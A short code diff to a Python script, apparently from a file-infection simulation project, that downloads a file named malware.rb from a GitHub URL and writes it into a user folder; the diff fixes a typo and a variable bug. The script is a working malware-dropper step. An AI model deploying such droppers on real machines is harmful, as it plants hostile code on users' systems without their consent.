@@ -4,7 +4,7 @@ import subprocess
 
 # Fetches the URL of a Ruby file named "Malware.rb" from GitHub
 def get_url():
-    # Pleaes check Malware.rb before execute this script
+    # Please check Malware.rb before execute this script
     url = 'https://raw.githubusercontent.com/OguzKaira/Ruby-File-Infection-Simulation/main/src/malware.rb'
     r = requests.get(url, allow_redirects=True)
 
@@ -12,10 +12,10 @@ def get_url():
 
 # Changes the current working directory to the specified path (user folder)
 # Attempts to write the downloaded file content (from the file object) to a local file named "Malware.rb"
-def download(path , file):
+def download(path , web):
     os.chdir(path)
     try:
-        open('malware.rb', 'wb').write(r.content)
+        open('malware.rb', 'wb').write(web.content)
     except:
         pass
 
